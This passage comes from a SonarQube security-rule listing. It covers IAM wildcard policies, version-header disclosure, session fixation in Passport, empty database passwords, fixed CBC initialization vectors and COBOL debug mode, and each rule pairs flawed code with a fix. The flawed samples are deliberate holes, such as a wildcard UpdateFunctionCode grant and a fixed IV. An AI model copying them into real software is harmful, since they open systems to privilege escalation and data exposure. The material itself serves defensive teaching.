</pre>
<h4>Compliant solution</h4>
<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyDocument({
    statements: [new iam.PolicyStatement({
        effect: iam.Effect.ALLOW,
        actions: [&#34;lambda:UpdateFunctionCode&#34;],
        resources: [&#34;arn:aws:lambda:us-east-2:123456789012:function:my-function:1&#34;],
    })],
});
</pre>
<h3>How does this work?</h3>
<h4>Principle of least privilege</h4>
<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted
enough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>
<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy
with overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.
In this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> AWS Documentation - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv" rel="nofollow">Policies and permissions
  in IAM: Grant least privilege</a> </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> Rhino Security Labs - <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" rel="nofollow">AWS IAM Privilege Escalation -
  Methods and Mitigation</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-269</a> - Improper Privilege Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5689">
              typescript:S5689
            </a>
          </td>
          <td>
            <details>
              <p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a
significant security risk depending on the production environement.</p>
<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>
<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit
known vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those
vulnerabilities.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Version information is accessible to end users. </li><li> Internal systems do not benefit from timely patch management workflows. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying
architectures. This is known as the &#34;need to know&#34; principle.</p>
<p>The most effective solution is to remove version information disclosure from what end users can see, such as the &#34;x-powered-by&#34; header.<br /> This
can be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>
<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that
this does not provide as much protection as regular updates and patches.<br /> Security by obscurity is the least foolproof solution of all. It should
never be the only defense mechanism and should always be combined with other security measures.</p>
<h2>Sensitive Code Example</h2>
<p>In <a href="https://www.npmjs.com/package/express" rel="nofollow">Express.js</a>, version information is disclosed by default in the <code>x-powered-by</code>
HTTP header:</p>
<pre>
let express &#61; require(&#39;express&#39;);

let example &#61; express(); // Sensitive

example.get(&#39;/&#39;, function (req, res) {
  res.send(&#39;example&#39;)
});
</pre>
<h2>Compliant Solution</h2>
<p><code>x-powered-by</code> HTTP header should be disabled in <a href="https://www.npmjs.com/package/express" rel="nofollow">Express.js</a> with
<code>app.disable</code>:</p>
<pre>
let express &#61; require(&#39;express&#39;);

let example &#61; express();
example.disable(&#34;x-powered-by&#34;);
</pre>
<p>Or with helmet’s <a href="https://www.npmjs.com/package/helmet" rel="nofollow">hidePoweredBy</a> middleware:</p>
<pre>
let helmet &#61; require(&#34;helmet&#34;);

let example &#61; express();
example.use(helmet.hidePoweredBy());
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html" rel="nofollow">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Information Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5876">
              javascript:S5876
            </a>
          </td>
          <td>
            <details>
              <p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and
impersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>
<h2>Why is this an issue?</h2>
<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically
works:</p>
<ul><li> When a user visits a website or logs in, a session is created for them. </li><li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li><li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,
  the attacker sends the victim an email containing a link with this predetermined session identifier. </li><li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the
  attacker. </li><li> At this point, the attacker can hijack and impersonate the victim’s session. </li></ul>
<h3>What is the potential impact?</h3>
<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain
unauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>
<h4>Impersonation</h4>
<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid
credentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing
malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as
revealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>
<h4>Data Breach</h4>
<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include
personal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can
be used for identity theft, financial fraud, or other malicious purposes.</p>
<h4>Privilege Escalation</h4>
<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher
privileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized
modifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>
<h2>How to fix it in Passport</h2>
<h3>Code examples</h3>
<p>Upon user authentication, it is crucial to regenerate the session identifier to prevent fixation attacks. Passport provides a mechanism to achieve
this by using the <code>req.session.regenerate()</code> method. By calling this method after successful authentication, you can ensure that each user
is assigned a new and unique session ID.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
app.post(&#39;/login&#39;,
  passport.authenticate(&#39;local&#39;, { failureRedirect: &#39;/login&#39; }),
  function(req, res) {
    // Noncompliant - no session.regenerate after login
    res.redirect(&#39;/&#39;);
  });
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
app.post(&#39;/login&#39;,
  passport.authenticate(&#39;local&#39;, { failureRedirect: &#39;/login&#39; }),
  function(req, res) {
    let prevSession &#61; req.session;
    req.session.regenerate((err) &#61;&gt; {
      Object.assign(req.session, prevSession);
      res.redirect(&#39;/&#39;);
    });
  });
</pre>
<h3>How does this work?</h3>
<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated
during the authentication process.</p>
<p>Here’s how session fixation protection typically works:</p>
<ol><li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored
  in a cookie or passed through URL parameters. </li><li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows
  the attacker to potentially gain unauthorized access to the user’s session. </li><li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a
  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li><li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.
  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li><li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier
  is typically stored in a new session cookie or passed through URL parameters. </li></ol>
<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,
secure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s
session and helps maintain the integrity and security of the application’s session management process.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="http://expressjs.com/en/resources/middleware/session.html" rel="nofollow">express-session</a> </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://medium.com/passportjs/fixing-session-fixation-b2b68619c51d" rel="nofollow">Fixing Session Fixation</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> -
  Broken Authentication </li><li> <a href="https://owasp.org/www-community/attacks/Session_fixation" rel="nofollow">OWASP Sesssion Fixation</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6317">
              javascript:S6317
            </a>
          </td>
          <td>
            <details>
              <p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated
resources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions
than expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher
level of access.</p>
<h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)
are called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>&#34;*&#34;</code> permissions for example.) This is especially
true if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of
permissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles
that have more permissions than they need.</p>
<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>
<h3>What is the potential impact?</h3>
<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be
able to perform actions beyond their intended scope.</p>
<h4>Privilege escalation</h4>
<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be
able to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>
<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and
delete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to
exfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe
consequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>
<h2>How to fix it in AWS CDK</h2>
<h3>Code examples</h3>
<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by
altering the code of a Lambda that executes with high privileges.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyDocument({
    statements: [new iam.PolicyStatement({
        effect: iam.Effect.ALLOW,
        actions: [&#34;lambda:UpdateFunctionCode&#34;],
        resources: [&#34;*&#34;], // Noncompliant
    })],
});
</pre>
<h4>Compliant solution</h4>
<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyDocument({
    statements: [new iam.PolicyStatement({
        effect: iam.Effect.ALLOW,
        actions: [&#34;lambda:UpdateFunctionCode&#34;],
        resources: [&#34;arn:aws:lambda:us-east-2:123456789012:function:my-function:1&#34;],
    })],
});
</pre>
<h3>How does this work?</h3>
<h4>Principle of least privilege</h4>
<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted
enough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>
<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy
with overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.
In this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> AWS Documentation - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv" rel="nofollow">Policies and permissions
  in IAM: Grant least privilege</a> </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> Rhino Security Labs - <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" rel="nofollow">AWS IAM Privilege Escalation -
  Methods and Mitigation</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-269</a> - Improper Privilege Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5689">
              javascript:S5689
            </a>
          </td>
          <td>
            <details>
              <p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a
significant security risk depending on the production environement.</p>
<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>
<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit
known vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those
vulnerabilities.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Version information is accessible to end users. </li><li> Internal systems do not benefit from timely patch management workflows. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying
architectures. This is known as the &#34;need to know&#34; principle.</p>
<p>The most effective solution is to remove version information disclosure from what end users can see, such as the &#34;x-powered-by&#34; header.<br /> This
can be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>
<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that
this does not provide as much protection as regular updates and patches.<br /> Security by obscurity is the least foolproof solution of all. It should
never be the only defense mechanism and should always be combined with other security measures.</p>
<h2>Sensitive Code Example</h2>
<p>In <a href="https://www.npmjs.com/package/express" rel="nofollow">Express.js</a>, version information is disclosed by default in the <code>x-powered-by</code>
HTTP header:</p>
<pre>
let express &#61; require(&#39;express&#39;);

let example &#61; express(); // Sensitive

example.get(&#39;/&#39;, function (req, res) {
  res.send(&#39;example&#39;)
});
</pre>
<h2>Compliant Solution</h2>
<p><code>x-powered-by</code> HTTP header should be disabled in <a href="https://www.npmjs.com/package/express" rel="nofollow">Express.js</a> with
<code>app.disable</code>:</p>
<pre>
let express &#61; require(&#39;express&#39;);

let example &#61; express();
example.disable(&#34;x-powered-by&#34;);
</pre>
<p>Or with helmet’s <a href="https://www.npmjs.com/package/helmet" rel="nofollow">hidePoweredBy</a> middleware:</p>
<pre>
let helmet &#61; require(&#34;helmet&#34;);

let example &#61; express();
example.use(helmet.hidePoweredBy());
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html" rel="nofollow">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Information Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2115">
              csharpsquid:S2115
            </a>
          </td>
          <td>
            <details>
              <p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>
<h2>Why is this an issue?</h2>
<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting
this vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication
credentials.</p>
<h3>What is the potential impact?</h3>
<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially
leading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and
integrity of the database and the data it contains.</p>
<h4>Unauthorized Access to Sensitive Data</h4>
<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can
include personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the
database. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to
identity theft, financial loss, or reputational damage.</p>
<h4>Compromise of System Integrity</h4>
<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the
entire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,
unauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the
organization to further security risks.</p>
<h4>Unwanted Modifications or Deletions</h4>
<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a
significant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For
example, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business
processes and potentially leading to financial and legal consequences.</p>
<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system
compromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain
system integrity, and protect the organization from potential harm.</p>
<h2>How to fix it in Entity Framework Core</h2>
<h3>Code examples</h3>
<p>The following code uses an empty password to connect to a SQL Server database.</p>
<p>The vulnerability can be fixed by using Windows authentication (sometimes referred to as integrated security).</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="302" data-diff-type="noncompliant">
protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
{
  optionsBuilder.UseSqlServer(&#34;Server&#61;myServerAddress;Database&#61;myDataBase;User Id&#61;myUsername;Password&#61;&#34;); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="302" data-diff-type="compliant">
protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
{
  optionsBuilder.UseSqlServer(&#34;Server&#61;myServerAddress;Database&#61;myDataBase;Integrated Security&#61;True&#34;);
}
</pre>
<h3>How does this work?</h3>
<h4>Windows authentication (integrated security)</h4>
<p>When the connection string includes the <code>Integrated Security&#61;true</code> parameter, it enables Windows authentication (sometimes called
integrated security) for the database connection. With integrated security, the user’s Windows credentials are used to authenticate and authorize
access to the database. It eliminates the need for a separate username and password for the database connection. Integrated security simplifies
authentication and leverages the existing Windows authentication infrastructure for secure database access in your C# application.</p>
<p>It’s important to note that when using integrated security, the user running the application must have the necessary permissions to access the
database. Ensure that the user account running the application has the appropriate privileges and is granted access to the database.</p>
<p>The syntax employed in connection strings varies by provider:</p>
<p>Syntax</p><p>Supported by</p><p><code>Integrated Security&#61;true;</code></p><p>SQL Server, Oracle, Postgres</p><p><code>Integrated Security&#61;SSPI;</code></p><p>SQL Server, OLE DB</p><p><code>Integrated Security&#61;yes;</code></p><p>MySQL</p><p><code>Trusted_Connection&#61;true;</code></p><p>SQL Server</p><p><code>Trusted_Connection&#61;yes;</code></p><p>ODBC</p>
<p>Note: Some providers such as MySQL do not support Windows authentication with .NET Core.</p>
<h3>Pitfalls</h3>
<h4>Hard-coded passwords</h4>
<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.
Here are a few reasons why it is not recommended:</p>
<ol><li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or
  attackers. This can lead to unauthorized access to the database and potential data breaches. </li><li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be
  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li><li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control
  system, the password will be visible to anyone with access to the repository, which is a security risk. </li></ol>
<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,
configuration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information
from the codebase.</p>
<h2>Resources</h2>
<ul><li> <a href="https://docs.microsoft.com/en-us/troubleshoot/aspnet/create-web-config" rel="nofollow">Create the Web.config file for an ASP.NET application</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken
  Authentication </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/521" rel="nofollow">MITRE, CWE-521</a> - Weak Password Requirements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S3329">
              csharpsquid:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a &#34;starting variable&#34; (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.IO;
using System.Security.Cryptography;

public void Encrypt(byte[] key, byte[] dataToEncrypt, MemoryStream target)
{
    var aes &#61; new AesCryptoServiceProvider();

    byte[] iv     &#61; new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
    var encryptor &#61; aes.CreateEncryptor(key, iv); // Noncompliant

    var cryptoStream &#61; new CryptoStream(target, encryptor, CryptoStreamMode.Write);
    var swEncrypt    &#61; new StreamWriter(cryptoStream);

    swEncrypt.Write(dataToEncrypt);
}
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code implicitly uses a number generator that is considered <strong>strong</strong>, thanks to <code>aes.IV</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
using System.IO;
using System.Security.Cryptography;

public void Encrypt(byte[] key, byte[] dataToEncrypt, MemoryStream target)
{
    var aes &#61; new AesCryptoServiceProvider();

    var encryptor &#61; aes.CreateEncryptor(key, aes.IV);

    var cryptoStream &#61; new CryptoStream(target, encryptor, CryptoStreamMode.Write);
    var swEncrypt    &#61; new StreamWriter(cryptoStream);

    swEncrypt.Write(dataToEncrypt);
}
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure high security, initialization vectors must meet two important criteria:</p>
<ul><li> IVs must be unique for each encryption operation. </li><li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li></ul>
<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br /> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/329" rel="nofollow">MITRE, CWE-329</a> - Not Using an Unpredictable IV with CBC Mode </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf" rel="nofollow">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:S4507">
              cobol:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers</p>
<p><code>WITH DEBUGGING MODE</code> activates all debug lines (ones with &#39;D&#39; or &#39;d&#39; in the indicator area). This clause should not be used in
production.</p>
<h2>Sensitive Code Example</h2>
<pre>
SOURCE-COMPUTER. IBM-370 WITH DEBUGGING MODE.
</pre>
<h2>Compliant Solution</h2>
<pre>
SOURCE-COMPUTER. IBM-370.
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:SQL.SelectWithNoWhereClauseCheck">
              cobol:SQL.SelectWithNoWhereClauseCheck
            </a>
          </td>
          <td>
            <details>
              <p>Although the <code>WHERE</code> condition is optional in a <code>SELECT</code> statement, for performance and security reasons, a
<code>WHERE</code> clause should always be specified to prevent reading the whole table.</p>
<h2>Ask Yourself Whether</h2>
